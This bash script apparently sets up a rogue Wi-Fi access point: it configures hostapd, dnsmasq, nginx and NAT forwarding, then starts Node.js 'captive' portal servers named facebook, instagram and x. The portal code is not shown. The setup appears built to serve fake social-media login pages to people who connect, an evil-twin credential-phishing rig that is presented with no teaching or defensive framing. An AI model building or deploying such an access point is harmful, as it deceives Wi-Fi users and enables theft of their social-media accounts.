#!/bin/bash

# Hostdirect Setup Script
# This script sets up all components for the hostdirect system including
# hostapd, dnsmasq, nginx, and related configurations

set -euo pipefail

# Color variables for better output
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m' # No Color

# Root directory setup
ROOT_DIR="$(cd "$(dirname "$0")/../.." && pwd)"
NGINX_DIR="$ROOT_DIR/nginx"
CONFIG_DIR="$NGINX_DIR/configs"
SCRIPTS_DIR="$NGINX_DIR/scripts"

# Configuration files
HOSTAPD_CONF="$CONFIG_DIR/hostapd.conf"
DNSMASQ_CONF="$CONFIG_DIR/dnsmasq.conf"
NGINX_CONF="$CONFIG_DIR/nginx.conf"

# Interface and network settings
IFACE="wlx00c0cab84be3"  # Default interface
IP_ADDR="192.168.4.1"
NETMASK="255.255.255.0"

# Function to check root privileges
check_root() {
    if [ "$EUID" -ne 0 ]; then
        echo -e "${RED}Please run as root${NC}"
        exit 1
    fi
}

# Function to install required packages
install_packages() {
    echo -e "${YELLOW}[*] Installing required packages...${NC}"
    apt-get update
    apt-get install -y hostapd dnsmasq nginx nodejs npm
    systemctl unmask hostapd
    systemctl enable hostapd
}

# Function to configure network interface
setup_interface() {
    echo -e "${YELLOW}[*] Configuring network interface $IFACE...${NC}"
    ip link set $IFACE down
    ip addr flush dev $IFACE
    ip addr add $IP_ADDR/24 dev $IFACE
    ip link set $IFACE up
}

# Function to configure hostapd
setup_hostapd() {
    echo -e "${YELLOW}[*] Configuring hostapd...${NC}"
    if [ ! -f "$HOSTAPD_CONF" ]; then
        echo -e "${RED}[!] hostapd.conf not found at $HOSTAPD_CONF${NC}"
        exit 1
    fi
    
    # Ensure interface is correctly set in hostapd.conf
    sed -i "s/^interface=.*/interface=$IFACE/" "$HOSTAPD_CONF"
    
    # Link configuration
    ln -sf "$HOSTAPD_CONF" /etc/hostapd/hostapd.conf
    
    # Enable and start service
    systemctl enable hostapd
    systemctl restart hostapd
}

# Function to configure dnsmasq
setup_dnsmasq() {
    echo -e "${YELLOW}[*] Configuring dnsmasq...${NC}"
    if [ ! -f "$DNSMASQ_CONF" ]; then
        echo -e "${RED}[!] dnsmasq.conf not found at $DNSMASQ_CONF${NC}"
        exit 1
    fi
    
    # Ensure interface is correctly set in dnsmasq.conf
    sed -i "s/^interface=.*/interface=$IFACE/" "$DNSMASQ_CONF"
    
    # Link configuration
    ln -sf "$DNSMASQ_CONF" /etc/dnsmasq.conf
    
    # Enable and start service
    systemctl enable dnsmasq
    systemctl restart dnsmasq
}

# Function to configure nginx
setup_nginx() {
    echo -e "${YELLOW}[*] Configuring nginx...${NC}"
    if [ ! -f "$NGINX_CONF" ]; then
        echo -e "${RED}[!] nginx.conf not found at $NGINX_CONF${NC}"
        exit 1
    fi
    
    # Create nginx directories if they don't exist
    mkdir -p /var/log/nginx
    
    # Link configuration
    ln -sf "$NGINX_CONF" /etc/nginx/nginx.conf
    
    # Enable and start service
    systemctl enable nginx
    systemctl restart nginx
}

# Function to setup Node.js servers
setup_node_servers() {
    echo -e "${YELLOW}[*] Setting up Node.js servers...${NC}"
    
    # First install all dependencies
    if [ -f "$NGINX_DIR/captive/install_deps.sh" ]; then
        echo -e "${YELLOW}Installing dependencies for all services...${NC}"
        bash "$NGINX_DIR/captive/install_deps.sh"
    else
        echo -e "${RED}install_deps.sh not found${NC}"
        exit 1
    fi
    
    # Start all servers
    local projects=("facebook" "instagram" "x")
    for project in "${projects[@]}"; do
        local project_dir="$NGINX_DIR/captive/$project"
        if [ -d "$project_dir" ]; then
            echo -e "${YELLOW}Starting $project server...${NC}"
            cd "$project_dir"
            npm start &
        else
            echo -e "${RED}Project directory $project not found${NC}"
        fi
    done
}

# Function to enable IP forwarding
setup_ip_forwarding() {
    echo -e "${YELLOW}[*] Enabling IP forwarding...${NC}"
    echo 1 > /proc/sys/net/ipv4/ip_forward
    
    # Setup iptables rules
    iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
    iptables -A FORWARD -i $IFACE -o eth0 -j ACCEPT
    iptables -A FORWARD -i eth0 -o $IFACE -m state --state RELATED,ESTABLISHED -j ACCEPT
}

# Main setup function
main() {
    check_root
    
    echo -e "${YELLOW}Starting Hostdirect setup...${NC}"
    
    # Stop services if they're running
    systemctl stop hostapd dnsmasq nginx 2>/dev/null || true
    killall node 2>/dev/null || true
    
    # Run setup steps
    install_packages
    setup_interface
    setup_ip_forwarding
    setup_hostapd
    setup_dnsmasq
    setup_nginx
    setup_node_servers
    
    echo -e "${GREEN}[✓] Setup completed successfully!${NC}"
    echo -e "${GREEN}You can now connect to the WiFi network.${NC}"
    echo -e "SSID: $(grep '^ssid=' "$HOSTAPD_CONF" | cut -d'=' -f2)"
    echo -e "IP Address: $IP_ADDR"
}

# Run main setup
main "$@"
